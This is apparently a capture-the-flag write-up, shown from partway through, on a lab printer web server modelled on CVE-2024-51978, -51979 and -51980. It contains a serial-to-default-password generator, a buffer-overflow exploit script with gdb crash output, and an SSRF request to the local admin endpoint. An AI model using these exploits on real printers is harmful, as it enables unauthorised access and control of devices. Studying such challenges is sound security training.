    b'iSwrrtpr', b'ucBFJbGj', b'Nzs7rhKJ', b'uHugTJX5', b'aXN3FsUF', b'uyHDwwUK', b'tbnJTYje', b'SmgfLZ2n',
    b'4sXy9D8j', b'YLVSee68', b'3U5TbNNS', b'QjYfTBKu', b'T*8AF8dk', b'F8xQDTrW', b'Pyeda62U', b'33sghDrE',
    b'ThiW9Naz', b'BU9TDd7k', b'72sgwM&G', b'VkV+uSUt', b'HpTdi9jL', b'G3AbGyAH', b'zbW8YCSy', b'eKB25SCe',
    b'rbzpCtQN', b'EZSRB966', b'nJAxxUbS', b'7GZRAG9E', b'PaMCwYGQ', b'TZy2AeYr', b'jMgYEPUT', b'6QAepcUc',
    b'jdWU9pXy', b'CeZs6T8g', b'jEEDBNPn', b'fCHg4V5W', b'rTUUjyPG', b'3L5SNJhr', b'XbXK4Lg9', b'ZcdGAzLH',
    b'ANfMJ&6p', b'S4URfyzc', b'Pai9muCn', b'Nei%6NwR', b'BnUWBHg6', b'FwGyWrux', b'mwkuuGXX', b'WR$LK5Qu',
    b'Lxs4DgNM', b'KAYMHcKy', b'UnWYeeUp', b'2cc3EzeX', b'7nVPpdCd', b'LDPgHa9b', b'Yfwsz7zR', b'tGhb9Ych',
    b'Gxi4S8jC', b'QEiWU2cm', b'PFhyTxjN', b'LrpTgGLw', b'PUfziDzE', b'ACbmRneN', b'gYmjyNjF', b'RuZctKSS',
    b'k8KdHgDB', b'pJEA3hSG', b'X6rbghrk', b'9mnbf3up', b'4WU2hMHx', b'TgmNEn45', b'zRnQReEn', b'DfsPzxsX',
    b'UyScxhhw', b'knEsS3CX', b'xuPUKwFf', b'Ks4nKt2z', b'trBf!b67', b'rhHgt4gX', b'2N8sPf#d', b'eFMjhMcB',
    b'aWLeRu9M', b'4MiN4D63', b'5nG9jMGh', b'SA5pnyQ6', b'UnSQ94nx', b'kPjzBBxy', b'6CppHT3R', b'3VPgRgiL',
    b'cP9JJDJr', b'MyMWzUMj', b'xyG4ACEd', b'dbnAbG8e', b'RnHGYc6F', b'ktCQnJWk', b'XBt5Vxr2', b'wH6iY9f9',
    b'atB4eri8', b'8SdHujf8', b'inLRdn5s', b'Fh3N*pWc', b'Fb3XYtZz', b'GADACWcS', b'r8tsDgph', b'EumHNmFg',
    b'rRFKrK2x', b'TQ9nUnNk', b'P5hss6GX', b'mX8ZSQtr', b'BJMjyd7H', b'EC7r5fEm', b'TPjQpDaa', b'SZeMDpfR',
    b'XEDJeraW', b'YYNTgsah', b'6uupfWF!', b'7RcTLwHX', b'ycYr3dwT', b'7VwCnTFQ', b'JGF6iigf', b'M72Kea4f',
    b'ZxfZWbVb', b'NcT3LGBV', b'HBU68uaa', b'UeHK4pnf', b'sDjzNHHd', b'CGjgeutc', b'PC4JbuC2', b'tNYQc7Xs',
    b'RGNsJQhD', b'HKEh2fba', b'49x4PLUz', b'N6MLNkY5', b'NrMHeE9d', b'j5NkznV4', b'n8At3YKi', b'ZnHwAEnZ',
    b'3LnUmF8E', b'RBXzdUpA', b'FwGHBVej', b'3wkkik7E', b'fpyGnp2u', b'ANBwfiPb', b'Ztt8X9zG', b'47K7QWix',
    b'TzJfUdNY', b'hpD?MEAm', b'sJRh4Jni', b'TyQUgEEH', b'FBJnWWwx', b'7cN3GH6e', b'hWQhzFTN', b'GamDhsgZ',
    b'yXM4cZKt', b'9BJPKtaC', b'NVNpe4kJ', b'uSyxGxbz', b'h5zTpV3U', b'TAajcQ4h', b'VjYMEusS', b'Wpj237VG',
    b'yAjHYVVV', b'Hb6k7Cwe', b'yZbuDBEi', b'S4wpBmZM', b'DwFra8wk', b'j#Pk5r9W', b'PjkfS9WB', b'gHf3YGA3',
    b'ihDtdUCu', b'KARzJDfR', b'M7fApB5U', b'MiD44gRC', b'RdEM8y5W', b'4GsGuPag', b'pETQc4k2', b'pZZu7Ras',
    b'AJReAUBy', b'EAMmQsWe', b'BeC2XJi8', b'PujT2eRf', b'2UXLeAJu', b'hMPbY3MQ', b'QeawRP*p', b'SbCbW9Tf',
    b'EhNNtLyj', b'B8RjceGs', b'LaydmLeD', b'JFR7T47f', b'WCbAdTfm', b'srN9gNSE', b'gAn7h8Yp', b'4PnTKVse',
    b'HDxGwLsN', b'tR8XUSRg', b'wLe-3Xf8', b'zH7cpxsd', b'tCc5sWFX', b'3hzTj5BS', b'hLK6f&g4', b'tCzzSsm7',
]

#for i in range(len(ORIGINAL_INDEX_TO_MAGIC_STRING_ARRAY)):
#    if ORIGINAL_INDEX_TO_MAGIC_STRING_ARRAY[i]!=INDEX_TO_MAGIC_STRING_ARRAY[i]:
#        print("INDEX_TO_MAGIC_STRING_ARRAY differs at index: %d" %i)

def calculate_checksum(serial):
    checksum = 0
    for char in serial:
        if char.isdigit():
            checksum += int(char)
    return checksum

def get_magic_string(checksum):
    index = CHECKSUM_TO_INDEX_ARRAY[checksum]
    final_index = index & 0xFF
    print("index %d" %index)
    return INDEX_TO_MAGIC_STRING_ARRAY[final_index]

def prepare_hash_buffer(serial, magic_string):
    # Pad serial to 16 bytes with '0' if it's shorter
    serial_padded = serial.ljust(16, '0')
    serial_bytes = serial_padded.encode('ascii')
    
    # Reverse the magic string
    reversed_magic = magic_string[::-1]

    # Perform the (byte + 255) operation, which wraps around (modulo 256)
    transformed_magic_bytes = bytes([(b + 255) % 256 for b in reversed_magic])
    
    return serial_bytes[:16] + transformed_magic_bytes

def apply_substitution_cipher(s):
    substitutions = {
        'I': '$', 'O': ':', 'Z': '&',
        'b': '*', 'l': '#', 'o': '?',
        'q': '-', 'v': '@', 'y': '>',
        'z': '%'
    }
    result = list(s)
    for i, char in enumerate(result):
        if char in substitutions:
            result[i] = substitutions[char]
    return "".join(result)

def generate_password(serial_number):
    # Ensure serial is exactly 12 chars for this specific algorithm
    if len(serial_number) != 12:
        # Fallback logic for generating a serial if one isn't provided.
        # Not needed for our case but good practice.
        # For now, we'll just assert.
        raise ValueError("Serial number must be 12 characters long")
        
    checksum = calculate_checksum(serial_number)
    print("checksum %d" %checksum)
    magic_string = get_magic_string(checksum)
    print("magic_string %s" %magic_string)
    
    # The C code pads the 12-byte serial to 16 bytes when preparing the hash buffer
    hash_buffer = prepare_hash_buffer(serial_number, magic_string)
    print("hash_buffer %s" %hash_buffer)
    
    sha256_hash = hashlib.sha256(hash_buffer).digest()
    b64_encoded = base64.b64encode(sha256_hash).decode('ascii')
    truncated_b64 = b64_encoded[:24]
    final_password = apply_substitution_cipher(truncated_b64)
    return final_password

if __name__ == "__main__":
    serial1 = input("Insert the serial number: ")
    password_from_script = generate_password(serial1)
    
    print(f"SERIAL:                {serial1}")
    print(f"Password from Script:  {password_from_script}")

```

The algorithm for generating the password from `CVE-2024-51978` requires the data from two arrays.
Since we want to be sure, that we use the correct values for `CHECKSUM_TO_INDEX_ARRAY` and `INDEX_TO_MAGIC_STRING_ARRAY`, we have also created a Python script for extracting the values from the tables in the ELF.

First of all, we have to dump the `.data` and `.rodata` sections:
```
objdump -s -j .rodata printer_build > rodata_dump.txt
objdump -s -j .data printer_build > data_dump.txt
```

Then, we can execute the following script and copy the arrays with the correct values in the script above:

```Python
import re

# --- Configuration ---
# File offsets found from your objdump output.
CHECKSUM_TABLE_OFFSET = 0x4020
POINTER_TABLE_OFFSET = 0x7020

# The number of elements we expect in each table.
NUM_CHECKSUM_ENTRIES = 256
NUM_POINTERS = 256

# The input files from objdump.
RODATA_DUMP_FILE = "rodata_dump.txt"
DATA_DUMP_FILE = "data_dump.txt"


def parse_dump_file(filename):
    """Parses an objdump output file into a dictionary mapping file offsets to raw bytes."""
    byte_map = {}
    line_regex = re.compile(r"^\s*([0-9a-fA-F]+)\s+((?:[0-9a-fA-F]{8}\s?){1,4})")
    
    with open(filename, 'r') as f:
        for line in f:
            match = line_regex.match(line)
            if match:
                offset = int(match.group(1), 16)
                hex_data = match.group(2).replace(" ", "")
                raw_bytes = bytes.fromhex(hex_data)
                
                # Store each byte at its absolute file offset
                for i in range(len(raw_bytes)):
                    byte_map[offset + i] = raw_bytes[i]
    return byte_map

def main():
    """Main function to parse the dumps and print Python arrays."""
    
    # --- 1. Parse both dump files into one map ---
    print(f"Reading data from {RODATA_DUMP_FILE} and {DATA_DUMP_FILE}...")
    byte_map = parse_dump_file(RODATA_DUMP_FILE)
    byte_map.update(parse_dump_file(DATA_DUMP_FILE))
    print("Successfully parsed dump files.")

    # --- 2. Process Checksum-to-Index Table (from .rodata) ---
    checksum_array = []
    for i in range(NUM_CHECKSUM_ENTRIES):
        current_offset = CHECKSUM_TABLE_OFFSET + (i * 4)
        byte_chunk = bytes([byte_map[current_offset + j] for j in range(4)])
        value = int.from_bytes(byte_chunk, byteorder='little', signed=True)
        checksum_array.append(value)
        
    print("\n# Table 1: Maps a checksum to an index.")
    print("CHECKSUM_TO_INDEX_ARRAY = [")
    for i in range(0, len(checksum_array), 16):
        line = ", ".join(map(str, checksum_array[i:i+16]))
        print(f"    {line},")
    print("]\n")

    # --- 3. Process Pointer Table and Strings ---
    string_array = []
    for i in range(NUM_POINTERS):
        # Read the 8-byte value from the .data section
        pointer_offset = POINTER_TABLE_OFFSET + (i * 8)
        byte_chunk = bytes([byte_map[pointer_offset + j] for j in range(8)])
        
        # ** THIS IS THE CORRECTED LOGIC **
        # The value is a direct FILE OFFSET, not a VMA.
        string_target_offset = int.from_bytes(byte_chunk, byteorder='little', signed=False)
        
        if string_target_offset == 0:
            string_array.append(b"")
            continue
        
        current_string = bytearray()
        offset_in_string = 0
        while True:
            # Read bytes from the target offset until a null terminator is found
            char_byte = byte_map.get(string_target_offset + offset_in_string)
            if char_byte is None or char_byte == 0:
                break
            current_string.append(char_byte)
            offset_in_string += 1
        string_array.append(bytes(current_string))

    print("# Table 2: The array of magic strings (salts).")
    print("INDEX_TO_MAGIC_STRING_ARRAY = [")
    for i in range(0, len(string_array), 8):
        line_items = [repr(s) for s in string_array[i:i+8]]
        print(f"    {', '.join(line_items)},")
    print("]")


if __name__ == "__main__":
    try:
        main()
    except FileNotFoundError as e:
        print(f"\nError: Could not find a required dump file: {e.filename}")
        print("Please generate the dump files first by running these commands:")
        print("  objdump -s -j .rodata printer_build > rodata_dump.txt")
        print("  objdump -s -j .data printer_build > data_dump.txt")
    except KeyError as e:
        print(f"\nError: A required address was not found in the dump files: {e}")
        print("Please ensure the dump files are complete and from the correct binary.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

```

We generate the password for the serial number we found in the `/etc/mnt_info.csv` file, we login with that password and get the flag in the `x-flag-3` HTTP header.

We get redirected to the `/stats` endpoint where we can also find a CSRF token in a `meta` tag.

## Flag 4

The flag is read from an environment variable in the `print` ELF file at the following line:

```C
  local_40 = getenv("FLAG_4");
```

With the help of an LLM chatbot, we see that is is used in the `/jobs/manage` endpoint.

"GET" endpoint
```C
            iVar1 = strcmp(local_258,"/jobs/manage");
            if (iVar1 == 0) {
              FUN_00403ee4(param_1);
            }
```

```C
void FUN_00403ee4(undefined4 param_1)

{
  size_t sVar1;
  char local_108 [256];
  
  if (DAT_004072b0 == 0) {
    FUN_00402844(param_1); // unauthorized page
  }
  else {
    snprintf(local_108,0x100,"{\"status\":\"ok\",\"flag\":\"%s\"}\n",PTR_s_NO_FLAG_SET_004071a0);
    sVar1 = strlen(local_108);
    FUN_00402748(param_1,
                 "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %zu\r\n\r\n%s"
                 ,sVar1,local_108);
  }
  return;
}
```

"POST" endpoint
```C
            iVar1 = strcmp(local_258,"/jobs/manage");
            if (iVar1 == 0) {
              FUN_00403f72(param_1,local_38,local_30,local_10);
            }
```

```C
void FUN_00403f72(undefined4 param_1,undefined8 param_2,char *param_3,long param_4)

{
  int iVar1;
  size_t sVar2;
  char local_1b08 [2048];
  char local_1308 [4096];
  undefined1 local_308 [608];
  undefined1 local_a8 [80];
  char *local_58;
  char *local_50;
  ulong local_48;
  ulong local_40;
  char *local_38;
  char *local_30;
  char *local_28;
  char *local_20;
  char *local_18;
  char *local_10;
  
  if (((param_4 == 0) || (*(int *)(param_4 + 0x244) == 0)) || (DAT_004072b0 == 0)) {
    FUN_00402844(param_1);
  }
  else if (param_3 == (char *)0x0) {
    FUN_0040281d(param_1); // unauthorized page
  }
  else {
    local_10 = strstr(param_3,"<Job>");
    if (local_10 == (char *)0x0) {
      local_18 = (char *)0x0;
    }
    else {
      local_18 = strstr(local_10,"</Job>");
    }
    if ((local_10 == (char *)0x0) || (local_18 == (char *)0x0)) {
      FUN_0040281d(param_1);
    }
    else {
      local_20 = strstr(local_10,"<ID>");
      if (local_20 == (char *)0x0) {
        local_28 = (char *)0x0;
      }
      else {
        local_28 = strstr(local_20,"</ID>");
      }
      local_30 = strstr(local_10,"<URL>");
      if (local_30 == (char *)0x0) {
        local_38 = (char *)0x0;
      }
      else {
        local_38 = strstr(local_30,"</URL>");
      }
      if (((local_20 == (char *)0x0) || (local_28 == (char *)0x0)) ||
         ((local_30 == (char *)0x0 ||
          (((local_38 == (char *)0x0 || (local_18 < local_28)) || (local_18 < local_38)))))) {
        FUN_0040281d(param_1);
      }
      else {
        local_20 = local_20 + 4;
        local_30 = local_30 + 5;
        local_40 = (long)local_28 - (long)local_20;
        local_48 = (long)local_38 - (long)local_30;
        if (((local_40 == 0) || (0x40 < local_40)) || ((local_48 == 0 || (0x200 < local_48)))) {
          FUN_0040281d(param_1);
        }
        else {
          memcpy(local_a8,local_20,local_40);
          local_a8[local_40] = 0;
          memcpy(local_308,local_30,local_48);
          local_308[local_48] = 0;
          iVar1 = FUN_00403b69(local_308,local_1308,0x1000);
          if (iVar1 == 0) {
            local_50 = strstr(local_1308,"\r\n\r\n");
            if (local_50 == (char *)0x0) {
              local_58 = local_1308;
            }
            else {
              local_58 = local_50 + 4;
            }
            snprintf(local_1b08,0x800,
                     "{\"job_id\":\"%s\",\"status\":\"queued\",\"preview\":\"%.1024s\"}\n",local_a8,
                     local_58);
            sVar2 = strlen(local_1b08);
            FUN_00402748(param_1,
                         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %zu\r\n\r\n%s"
                         ,sVar2,local_1b08);
          }
          else {
            FUN_0040281d(param_1);
          }
        }
      }
    }
  }
  return;
}
```

The "GET" and also the "POST" endpoints check whether `DAT_004072b0 == 0`, in that case the server responds with "Unauthorized".
We have to overcome that restriction, but `DAT_004072b0` is only set in the `FUN_00402dba` function, which is called nowhere in the code.

```C
void FUN_00402dba(void)

{
  DAT_004072b0 = 1;
                    // WARNING: Subroutine does not return
  longjmp((__jmp_buf_tag *)&DAT_004071e0,1);
}
```

Now, we can read in the code above, `gcc -o %s %s -fno-stack-protector -fno-omit-frame-pointer -no-pie -O0 -include build_cfg.h %s -lcrypto` or analyze the `printer` with the pwntools `checksec` command, for seeing that the `printer` ELF file is not a position independent executable and that there no other security checks:
```
checksec printer
```

So, we have to exploit `CVE-2024-51979` for executing the `FUN_00402dba` function.


As explained in the [video](https://www.youtube.com/watch?v=--SaQKmcyiU&t=292s), the stack-based buffer happens if the `Origin` header is not present and
the `Referer` header is present containing a URL with a long domain name matching the value of the `Host` header.

We need to overwrite the value in the stack containing the return address for jumping to the `FUN_00402dba` function, at address `0x00402dba`, after the current function returns.
However, we do not know how long the hostname has to be, for overwriting the correct address.

First, we start the `printer` executable with a debugger:
```
gdb ./printer
>> run
```

We use the pwntools [`cyclic`](https://docs.pwntools.com/en/stable/commandline.html#pwn-cyclic) command and use its output as the value of the domain name in a "POST" request to the `/print` endpoint:
```
cyclic --length 250
```

In the HTTP request below the cookie `AuthCookie` we received after logging in and a CSRF token from HTML source code of the `/stats` endpoint are used.
The value of the `Referer` HTTP header has to end with `/stats`, since the server checks whether the HTTP request with the CSRF token, for example base64 decoded it is `/stats|1763157408|04da600b1ceff4a1`, is only valid when a request is issued from the `/stats` endpoint.

```
POST /print HTTP/1.1
Host: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajba
Referer: http://aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajba/stats
Cookie: AuthCookie=61e8436343ee525bc40d76a4a219b7cc
X-CSRF-Token: L3N0YXRzfDE3NjMxNTc0MDh8MDRkYTYwMGIxY2VmZjRhMQ==

```

```
Program received signal SIGSEGV, Segmentation fault.
0x000000000040365b in ?? ()
─── Assembly ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 0x000000000040365b  ? ret
 0x000000000040365c  ? push   %rbp
 0x000000000040365d  ? mov    %rsp,%rbp
 0x0000000000403660  ? sub    $0x450,%rsp
 0x0000000000403667  ? mov    %edi,-0x434(%rbp)
 0x000000000040366d  ? mov    %rsi,-0x440(%rbp)
 0x0000000000403674  ? mov    %rdx,-0x448(%rbp)
 0x000000000040367b  ? mov    %rcx,-0x450(%rbp)
 0x0000000000403682  ? cmpq   $0x0,-0x450(%rbp)
 0x000000000040368a  ? je     0x40369d
─── Breakpoints ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Expressions ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── History ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Memory ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Registers ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
      rax 0x0000000000000001       rbx 0x00007fffffffe1e8          rcx 0x00007fffffffd840      rdx 0x00007fffffffdb4a      rsi 0x00007fffffffd360
      rdi 0x00007fffffffdb60       rbp 0x6261616962616168          rsp 0x00007fffffffd8c8       r8 0x0000000000000000       r9 0x000000000044a790
      r10 0xb98449448bbb32a9       r11 0x00007ffff7a98dc0          r12 0x0000000000000000      r13 0x00007fffffffe1f8      r14 0x0000000000406df0
      r15 0x00007ffff7ffd020       rip 0x000000000040365b       eflags [ CF SF IF RF ]          cs 0x00000033               ss 0x0000002b        
       ds 0x00000000                es 0x00000000                   fs 0x00000000               gs 0x00000000               k0 0xffffffffff810400
       k1 0x00000000ffffffff        k2 0x00000000ffffffff           k3 0x0000000000000000       k4 0x00000000ffffffff       k5 0x0000000000000001
       k6 0x0000000000000000        k7 0x00000000fc800000
─── Source ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Stack ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[0] from 0x000000000040365b
[1] from 0x6261616b6261616a
[2] from 0x6261616d6261616c
[3] from 0x6261616f6261616e
[4] from 0x6261617162616170
[5] from 0x6261617362616172
[6] from 0x6261617562616174
[7] from 0x6261617762616176
[8] from 0x6261617962616178
[9] from 0x636161626361617a
[+]
─── Threads ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] id 18587 name printer from 0x000000000040365b
─── Variables ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

The value we want to overwrite is where the value `6261616b6261616a` is on the stack, so we use CyberChef to get its ASCII value
<https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Reverse('Character')&input=NjI2MTYxNmI2MjYxNjE2YQ> so that we can use it with the `cyclic` command for getting the padding length.

We execute `cyclic -l jaabkaab` and get that the padding is 136.

Then, we execute the following script, which automatizes the steps for getting the session cookie, getting a CSRF token and overwriting the return address on the stack, and get the flag.

```Python
import requests
import struct
import sys
import re

# --- Configuration ---
# IMPORTANT: Replace with the actual host and port of your target
TARGET_HOST = "HOST"
TARGET_PORT = 8000

# The address of the hidden "win gadget" function that sets the global flag.
WIN_GADGET_ADDRESS = 0x00402dba

# The offset in bytes to reach the saved return address on the stack.
PADDING_SIZE = 136

# --- Script ---

def get_csrf_token(session, base_url):
    """
    Makes an authenticated request to /stats and parses the CSRF token from the HTML.
    """
    stats_url = f"{base_url}/stats"
    print(f"[*] Fetching a fresh CSRF token from {stats_url}...")
    
    try:
        response = session.get(stats_url)
        if response.status_code != 200:
            print(f"\n[!] Error: Failed to fetch /stats. Status code: {response.status_code}")
            print("[!] Please check if your AuthCookie is correct and has not expired.")
            return None
        
        # Use regex to find the CSRF token in the meta tag
        # <meta name='csrf-token' content='TOKEN_VALUE'>
        match = re.search(r"name=['\"]csrf-token['\"]\s+content=['\"]([^'\"]+)['\"]", response.text)
        
        if match:
            token = match.group(1)
            print(f"[+] Successfully retrieved CSRF token: {token}")
            return token
        else:
            print("\n[!] Error: Could not find the CSRF token in the /stats page response.")
            print("[!] The page content may have changed.")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Error connecting to the server to get CSRF token: {e}")
        return None


def exploit():
    """
    Gets a CSRF token, crafts the payload, sends the exploit, and verifies success.
    """
    base_url = f"http://{TARGET_HOST}:{TARGET_PORT}"

    # --- 1. Get User Input (AuthCookie only) ---
    print("--- Mother Printer Exploit (Automated CSRF) ---")
    try:
        session_cookie = input("Enter your AuthCookie value: ").strip()
    except KeyboardInterrupt:
        print("\nExiting.")
        sys.exit()

    if not session_cookie:
        print("\n[!] Error: An AuthCookie is required.")
        return

    # --- 2. Set up session and retrieve CSRF token ---
    session = requests.Session()
    session.cookies.set("AuthCookie", session_cookie)
    
    csrf_token = get_csrf_token(session, base_url)
    if not csrf_token:
        return # Stop if we couldn't get the token

    # --- 3. Construct the Buffer Overflow Payload ---
    padding = b'A' * PADDING_SIZE
    target_address = struct.pack('<Q', WIN_GADGET_ADDRESS)[0:3]
    print("target_address")
    print(target_address)
    payload = padding + target_address
    hostname_payload = payload.decode('latin-1')

    print("\n[+] Constructed payload:")
    print(f"    - Padding: {PADDING_SIZE} bytes")
    print(f"    - Target Address: {hex(WIN_GADGET_ADDRESS)}")

    # --- 4. Send the Exploit Request ---
    exploit_url = f"{base_url}/print"
    
    # The Referer path must be '/stats' to match the path bound to the CSRF token.
    # The Host header must match the hostname in the Referer header.
    headers = {
        "X-CSRF-Token": csrf_token,
        "Referer": f"http://{hostname_payload}/stats",
        "Host": f"{hostname_payload}",
    }

    print(hostname_payload)
    print(f"\n[*] Sending exploit payload to {exploit_url}...")
    
    try:
        # We don't care about the response, only that the request is processed.
        response = session.post(exploit_url, headers=headers, data={"data": "pwn"}, timeout=3)
        print("status code %d" %response.status_code)
        print(response.text)
        print("[+] Exploit sent! The server may have closed the connection, this is expected.")
    except requests.exceptions.RequestException:
        # A timeout or connection reset is the most likely outcome of a successful exploit.
        print("[+] Exploit sent! Connection timed out or reset as expected.")

    # --- 5. Verify if the Exploit Succeeded ---
    verify_url = f"{base_url}/jobs/manage"
    print(f"\n[*] Verifying exploit by accessing {verify_url}...")
    
    try:
        # Use the same session so the AuthCookie is sent automatically
        response = session.get(verify_url)
        if response.status_code == 200 and "flag" in response.text:
            print("\n[SUCCESS] Exploit successful! The global flag was set.")
            print("Response from /jobs/manage:")
            print(response.text)
        else:
            print("\n[FAILURE] Exploit failed. The global flag was not set.")
            print("Please check the following:")
            print("  - Is your AuthCookie correct and not expired?")
            print("  - Try adjusting the PADDING_SIZE variable (common values are 72, 80, 88).")
            print(f"  - Server response (Status {response.status_code}):\n{response.text[:200]}")

    except requests.exceptions.RequestException as e:
        print(f"\n[!] Error during verification: {e}")


if __name__ == "__main__":
    exploit()
```

## Flag 5

We exploit the SSRF vulnerability, [CVE-2024-51980](https://www.youtube.com/watch?v=--SaQKmcyiU&t=1048s), in the `/jobs/manage` endpoint to access the `/admin` endpoint on the default HTTP port, which can be accessed only by local admins.

The endpoint requires an XML payload in the body of the "POST" request, which we can reconstruct by analyzing the `FUN_00403f72` function. We can exploit the SSRF vulnerability by inserting the local URL `http://127.0.0.1/admin` inside the `URL` tag.

We issue the following HTTP request and get the flag:

```HTTP
POST /jobs/manage HTTP/1.1
Host: SUBDOMAIN.ctfio.com:8000
Cookie: AuthCookie=ecd18810cb7ff48aad7a6e6b6206244a
Content-Length: 60

<Job><ID>job-123</ID><URL>http://127.0.0.1/admin</URL></Job>
```
